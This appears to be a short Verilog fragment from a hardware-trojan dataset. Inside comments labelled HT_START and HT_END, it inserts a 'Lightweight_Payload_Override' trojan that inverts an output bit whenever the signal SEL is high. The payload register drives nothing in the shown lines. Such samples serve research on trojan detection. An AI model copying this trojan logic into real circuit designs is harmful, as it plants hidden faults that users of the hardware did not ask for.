// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (SEL == 1'b1);
    htrojan_pay = htrojan_trig ? (OUT ^ 1'b1) : OUT;
end
// HT_END
endmodule
